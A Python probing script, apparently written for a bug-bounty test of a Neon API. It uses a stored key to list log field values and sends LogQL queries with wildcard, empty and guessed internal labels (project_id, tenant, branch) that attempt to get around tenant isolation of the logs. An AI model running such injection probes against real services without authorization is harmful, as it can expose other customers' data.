# -*- coding: utf-8 -*-
"""Logs 面收尾: fields values + logql label 变体(内部 label 注入尝试)"""
import http.client, ssl, json, time, os, sys

ctx = ssl.create_default_context()
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _neon_creds_stage import API_HOST, API_BASE
keyj = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_apikey.json')))
KEY = keyj.get('key') or keyj.get('api_key') or keyj.get('token') or list(keyj.values())[0]
ctxj = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), '_ctx.json')))
PID, BID = ctxj['pid'], ctxj['bid']

def req(method, path, body=None, headers=None):
    try:
        conn = http.client.HTTPSConnection(API_HOST, context=ctx, timeout=20)
        h = {'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json', 'Content-Type': 'application/json'}
        if headers:
            h.update(headers)
        conn.request(method, API_BASE + path, body=json.dumps(body).encode() if body is not None else None, headers=h)
        r = conn.getresponse()
        raw = r.read()
        st = r.status
        conn.close()
        return st, raw.decode('utf-8', 'replace')
    except Exception as e:
        return -1, 'EXC %s' % e

cb = {'Authorization': 'Bearer ' + str(KEY), 'X-Bug-Bounty': 'xxbo'}
B = '/projects/%s/branches/%s' % (PID, BID)

print('=== [1] fields values ===')
for f in ('service_name', 'severity_text', 'scope_name', 'entity_type'):
    st, raw = req('GET', B + '/logs/fields/%s/values?since=7d&limit=20' % f, headers=cb)
    print('[%s] -> %d %s' % (f, st, raw[:250]))
    time.sleep(0.3)

print('\n=== [2] logql label 变体(全空? label 注入面) ===')
q = [
    ('service_name 全匹配', {'logql': '{service_name=~".+"}', 'since': '7d', 'limit': 10}),
    ('severity', {'logql': '{severity_text=~".+"}', 'since': '7d', 'limit': 10}),
    ('无 label 选择器', {'logql': '|= "a"', 'since': '7d', 'limit': 10}),
    ('空选择器', {'logql': '{} |= "a"', 'since': '7d', 'limit': 10}),
    ('内部 label 猜测1', {'logql': '{project_id="%s"}' % PID, 'since': '7d', 'limit': 10}),
    ('内部 label 猜测2', {'logql': '{tenant="%s"}' % PID, 'since': '7d', 'limit': 10}),
    ('内部 label 猜测3', {'logql': '{branch="%s"}' % BID, 'since': '7d', 'limit': 10}),
    ('无时间窗', {'logql': '{service_name=~".+"}', 'limit': 10}),
    ('7d body_contains', {'body_contains': 'neon', 'since': '7d', 'limit': 10}),
]
for tag, body in q:
    st, raw = req('POST', B + '/logs/query', body, headers=cb)
    print('[%s] -> %d %s' % (tag, st, raw[:300]))
    time.sleep(0.3)
